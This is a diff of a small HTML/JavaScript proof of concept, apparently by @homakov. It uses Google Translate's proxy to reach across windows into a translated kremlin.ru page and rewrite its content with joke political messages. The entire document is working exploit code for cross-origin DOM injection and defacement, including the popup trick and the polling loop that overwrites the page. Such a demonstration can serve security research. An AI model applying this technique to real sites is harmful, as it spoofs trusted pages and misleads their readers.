@@ -1,16 +1,19 @@
 <script>
-// opener.location="http://translate.google.com/translate?hl=en&sl=ru&tl=en&u=http%3A%2F%2Fkremlin.ru%2F";
- wait = setInterval(function(){
-   // if(parent.opener.frames[0].document){
-   try{
-    var el = parent.opener.frames[0].document.getElementsByClassName('page')[0];
-    if(el){
-    el.innerHTML='<h2>Let me speak from my heart: Edward Snowden is a Russian Citizen. Thanks to @homakov!</h2>';
-    parent.close();
-    }
-   }catch(e){}
-      //clearInterval(wait);
-      //window.close();
-    //}
-  },500);
-</script>
+if(location.search=='?init'){
+  window.open('http://translate.google.com/translate?hl=en&sl=en&tl=ru&u=http%3A%2F%2Fhomakov.github.io%2Fguc2.html%3F1','','width=1px;heigh=1px;');
+  location='http://translate.google.com/translate?hl=en&sl=ru&tl=en&u=http%3A%2F%2Fkremlin.ru%2F';
+}else{
+  // under GUC
+  wait = setInterval(function(){
+    try{
+      var el = parent.opener.frames[0].document.getElementsByClassName('page')[0];
+      if(el){
+        el.innerHTML='<h2>Hey! Russia needs some rebranding. We are Mango Federation now!</h2>';
+        clearInterval(wait);
+      }
+    }catch(e){}
+    
+  }, 500);
+ 
+}
+</script>empty...
